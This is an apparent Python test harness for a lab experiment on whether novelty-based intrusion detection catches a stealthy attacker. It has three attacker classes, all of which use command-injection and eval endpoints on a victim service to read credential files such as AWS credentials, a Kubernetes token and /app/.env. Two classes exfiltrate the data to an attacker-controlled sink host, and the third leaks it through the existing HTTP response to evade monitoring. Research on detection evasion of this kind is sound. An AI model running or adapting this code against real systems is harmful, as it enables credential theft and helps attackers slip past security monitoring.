# Lab-confined evasion ladder. ONE objective (read a secret, exfiltrate) at three stealth levels,
# to test whether identity-anchored NOVELTY detection survives an attacker who avoids novelty.
# All fake secrets, internal network only.
#   A1 naive    : novel tools + novel secret paths + NEW outbound connection   (loud)
#   A2 lotl     : only profiled tools, reads in-profile /app/.env, but still a NEW outbound
#   A3 mimicry  : reads in-profile /app/.env, exfiltrates THROUGH the existing HTTP response
#                 (no execve, no new openat prefix, no new connect) -- living off the channel
import base64, json, random, sys, time, urllib.parse, urllib.request
VICTIM='http://victim:8000'; SINK_IP=sys.argv[1]; N=int(sys.argv[2]); R=random.Random(int(sys.argv[3]))
FORCE=sys.argv[4] if len(sys.argv)>4 else None  # force a single attacker class
def sh(c): urllib.request.urlopen(VICTIM+'/debug?cmd='+urllib.parse.quote(c),timeout=30).read()
def py(e): return urllib.request.urlopen(VICTIM+'/calc?expr='+urllib.parse.quote(e),timeout=30).read()
NOVEL_SECRETS=['/root/.aws/credentials','/var/run/secrets/kubernetes.io/serviceaccount/token']
PROFILED_SECRET='/app/.env'  # the app's config watcher reads this in steady state -> in victim profile

def a1(i):   # loud: novel discovery tools, novel secret files, new outbound
    for _ in range(R.randint(1,2)): sh(R.choice(['id','uname -a','cat /etc/passwd']))
    sh(f'cat {R.choice(NOVEL_SECRETS)}')
    loot=f'LOOT{i}-FAKE'; url=f'http://{SINK_IP}:8080/x'
    sh(f'python3 -c "import urllib.request as u;u.urlopen(u.Request({url!r},data=b{base64.b64encode(loot.encode())!r}))"')

def a2(i):   # living-off-the-land exec + in-profile secret, but exfil via NEW outbound
    sh('tail -c 1 /app/data.db >/dev/null 2>&1 || true')     # profiled tool (tail), profiled path
    py("open('/app/.env').read()")                            # in-profile read
    py(f"__import__('socket').create_connection(({SINK_IP!r},8080)).sendall(b'POST /x HTTP/1.0\\r\\nContent-Length:5\\r\\n\\r\\nLOOT{i}')")

def a3(i, harvest):  # mimicry: in-profile read, exfil through the already-open HTTP response
    # the secret leaves in the HTTP RESPONSE body of the victim's existing socket -> no new connect, no exec
    reps = R.randint(6,12) if harvest else 1
    for _ in range(reps):
        data = py("open('/app/.env').read()")                 # only in-profile openat of /app/.env
        time.sleep(R.uniform(0.02,0.15))
    assert b'FAKE' in data  # confirms the secret actually exfiltrated via the response

classes=[]
for i in range(N):
    c=FORCE if FORCE else R.choices(['A1','A2','A3h','A3s'],[0.3,0.3,0.2,0.2])[0]
    t0=time.monotonic_ns()
    try:
        if c=='A1': a1(i)
        elif c=='A2': a2(i)
        elif c=='A3h': a3(i,True)
        else: a3(i,False)
    except Exception as e: print('err',c,repr(e)[:80],file=sys.stderr)
    print(json.dumps({'variant':i,'cls':c,'t_start_ns':t0,'t_end_ns':time.monotonic_ns()}))
    time.sleep(R.uniform(0.4,1.0))
